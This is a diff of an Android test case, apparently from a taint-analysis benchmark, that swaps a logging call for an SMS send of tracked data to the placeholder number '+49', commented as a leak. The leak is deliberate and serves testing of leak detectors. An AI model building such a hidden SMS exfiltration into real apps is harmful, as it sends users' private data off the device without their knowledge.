@@ -1,15 +1,15 @@
 package org.cert.WriteFile;
 
-import java.io.FileOutputStream;
-import org.cert.WriteFile.Button1Listener;
-import org.cert.WriteFile.R;
-import android.os.Bundle;
 import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.util.Log;
 import android.view.Menu;
 import android.widget.Button;
+
+import java.io.FileOutputStream;
 
 /**
  * @testcase_name StartActivityForResult1
@@ -56,7 +56,8 @@ public class MainActivity extends Activity {
 		    	  outputStream = openFileOutput(filename, Context.MODE_PRIVATE);
 		    	  outputStream.write(sinkData.getBytes());		// SINK
 		    	  outputStream.close();
-		    	  Log.i(filename, sinkData);					// another sink
+					SmsManager sms = SmsManager.getDefault();
+					sms.sendTextMessage("+49", null, sinkData, null, null);  //sink, leak
 		    	} catch (Exception e) {
 		    	  e.printStackTrace();
 		    	}
